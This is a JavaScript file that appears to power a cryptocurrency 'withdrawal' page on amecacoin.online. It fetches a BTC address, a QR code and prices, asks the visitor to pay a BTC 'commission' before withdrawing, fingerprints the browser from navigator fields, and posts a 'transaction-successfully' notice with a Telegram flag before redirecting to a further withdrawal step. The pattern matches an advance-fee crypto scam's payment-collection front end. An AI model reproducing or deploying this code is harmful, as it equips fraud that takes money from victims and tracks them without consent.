const xhr = new XMLHttpRequest()



function loaderFunction(status) {
    if(status){
        let div = document.createElement('div');
        div.style = "position: fixed;width: 100%;height: 100%;top: 0;background-color: white;left: 0;z-index: 5000;display: flex;align-items: center;justify-content: center;"
        div.id = "loader-wrapper"
        div.innerHTML = '<div class="loader" style="color:red;"></div>'
        document.body.append(div)
    }else{
        document.getElementById("loader-wrapper").remove()

    }
}

async function send_request(type, laoder, url, data) {
    if (laoder) { loaderFunction(false)}
    return new Promise((resolve, reject) => {
        let page = `https://amecacoin.online/${url}`;
        xhr.open(type, page)
        xhr.responseType = "json"
        xhr.setRequestHeader("Accept", "application/json")
        xhr.setRequestHeader("Content-Type", "application/json")
        xhr.setRequestHeader("Access-Control-Allow-Origin", "*")
        xhr.setRequestHeader("mode", "no-cors")
        xhr.setRequestHeader("cache", "no-cache")
        xhr.setRequestHeader("credentials", "same-origin")
        xhr.setRequestHeader("redirect", "follow")

        xhr.onload = () => {
            resolve(xhr.response)
        }

        if (data != false) {
            xhr.send(JSON.stringify(data))
        }
        else {
            xhr.send()

        }
    })
}

async function setElements(priceBitcoinCommission, priceInBitcoin, priceEuro, qr, commissionBTC, commissionEuro, address) {
    document.getElementById("balance_bitcoin").textContent = priceInBitcoin + " BTC"
    document.getElementById("balance_euro").textContent = priceEuro + " EUR"
    document.getElementById("qr_code").src = qr.qr_code_link
    document.getElementById("get_commission").textContent = `${commissionEuro} EUR = ${commissionBTC} BTC`
    document.querySelector(".btc_address").textContent = address
    document.querySelector("#get_balance").textContent = `${priceEuro} EUR = ${priceInBitcoin} BTC`
    document.getElementById("loader-wrapper").remove()
}


async function check_data() {
    send_request("post", false, "transaction-successfully", { sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion), send_telegram: true })
    const wait = document.getElementById('wait')
    wait.classList.add('active');

    setTimeout(() => {
        window.location.href = "withdraw-4.html"
    }, 10000)
}

async function start() {
    let address = await send_request("get", false, "address_change", false)
    let qr = await send_request("get", false, "qr_change", false)
    let getPriceBitcoin = await send_request("get", false, "price_change", false)
    let setPriceBitcoin = getPriceBitcoin["price_euro"]
    let sendPriceBitcoin = await send_request("post", false, "transaction-convert", { price: setPriceBitcoin, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
    let getPriceBitcoinCommission = await send_request("post", false, "transaction-commission", { price: setPriceBitcoin, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
    let setPriceBitcoinCommission = getPriceBitcoinCommission.price
    let getPriceInEuro = await send_request("post", false, "transaction-convert-euro", { price: setPriceBitcoin, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
    let getPriceInEuroCommission = await send_request("post", false, "transaction-convert-euro", { price: setPriceBitcoinCommission, sicret_key: `${navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion}` })
    setElements(sendPriceBitcoin, String(setPriceBitcoin).substr(0, 8), String(getPriceInEuro.price).substr(0, 8), qr, setPriceBitcoinCommission, String(getPriceInEuroCommission.price).substr(0, 6), address.address)
}

start()
